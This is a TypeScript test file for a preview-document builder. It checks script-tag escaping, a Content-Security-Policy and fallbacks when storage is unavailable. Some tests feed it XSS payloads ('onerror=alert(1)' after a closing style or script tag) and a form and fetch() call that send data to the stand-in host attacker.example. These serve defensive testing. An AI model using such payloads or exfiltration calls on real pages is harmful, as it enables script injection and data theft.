import { runInNewContext } from "node:vm";

import { describe, expect, it } from "vitest";

import { composePreviewDocument } from "@/lib/preview";

describe("composePreviewDocument", () => {
  it("composes body HTML, CSS, and JavaScript into a complete document", () => {
    const document = composePreviewDocument({
      html: '<button id="save">Save</button>',
      css: "button { color: tomato; }",
      javascript: "document.querySelector('#save').disabled = true;",
    });

    expect(document).toContain("<!doctype html>");
    expect(document).toContain('<button id="save">Save</button>');
    expect(document).toContain("button { color: tomato; }");
    expect(document).toContain("document.querySelector('#save').disabled = true;");
  });

  it("neutralizes closing style and script tags in generated source", () => {
    const document = composePreviewDocument({
      html: "<main>Safe</main>",
      css: "</style><img src=x onerror=alert(1)>",
      javascript: "</script><img src=x onerror=alert(1)>",
    });

    expect(document).not.toContain("</style><img");
    expect(document).not.toContain("</script><img");
    expect(document).toContain("<\\/style><img");
    expect(document).toContain("<\\/script><img");
  });

  it("blocks generated applications from sending data to external origins", () => {
    const document = composePreviewDocument({
      html: '<form action="https://attacker.example"><input name="secret"></form>',
      css: "",
      javascript: "fetch('https://attacker.example')",
    });

    expect(document).toContain("connect-src 'none'");
    expect(document).toContain("form-action 'none'");
    expect(document).toContain("base-uri 'none'");
    expect(document).toContain("img-src data: blob:");
    expect(document).not.toContain("img-src data: blob: https:");
    expect(document).toContain("font-src data:");
    expect(document).not.toContain("font-src data: https:");
  });

  it("keeps generated interactions running when they use browser storage", () => {
    const document = composePreviewDocument({
      html: '<button id="save">Save</button>',
      css: "",
      javascript: `
        localStorage.setItem("draft", "ready");
        if (localStorage.getItem("draft") !== "ready") {
          throw new Error("Storage is unavailable");
        }
        window.localStorage.setItem("view", "board");
        if (window.localStorage.getItem("view") !== "board") {
          throw new Error("Window storage is unavailable");
        }
        document.querySelector("#save").addEventListener("click", () => {});
      `,
    });
    const script = document.match(/<script>([\s\S]*?)<\/script>/)?.[1];
    const listeners = new Map<string, () => void>();
    const errors: unknown[][] = [];
    const context: Record<string, unknown> = {
      console: {
        error: (...args: unknown[]) => errors.push(args),
        warn: (...args: unknown[]) => errors.push(args),
      },
      document: {
        querySelector: () => ({
          addEventListener: (type: string, listener: () => void) => {
            listeners.set(type, listener);
          },
        }),
      },
    };
    context.window = context;
    Object.defineProperty(context, "localStorage", {
      configurable: true,
      get() {
        throw new DOMException("Storage is unavailable", "SecurityError");
      },
    });
    Object.defineProperty(context, "sessionStorage", {
      configurable: true,
      get() {
        throw new DOMException("Storage is unavailable", "SecurityError");
      },
    });

    expect(script).toBeDefined();

    runInNewContext(script!, context);

    expect(errors).toEqual([]);
    expect(listeners.has("click")).toBe(true);
  });

  it("exposes generated global functions for inline HTML event handlers", () => {
    const document = composePreviewDocument({
      html: '<button onclick="save()">Save</button><output id="status">idle</output>',
      css: "",
      javascript: `
        function save() {
          document.querySelector("#status").textContent = "saved";
        }
      `,
    });
    const script = document.match(/<script>([\s\S]*?)<\/script>/)?.[1];
    const status = { textContent: "idle" };
    const context: Record<string, unknown> = {
      console,
      document: { querySelector: () => status },
    };
    context.window = context;

    expect(script).toBeDefined();

    runInNewContext(script!, context);

    expect(context.save).toBeTypeOf("function");
    (context.save as () => void)();
    expect(status.textContent).toBe("saved");
  });
});
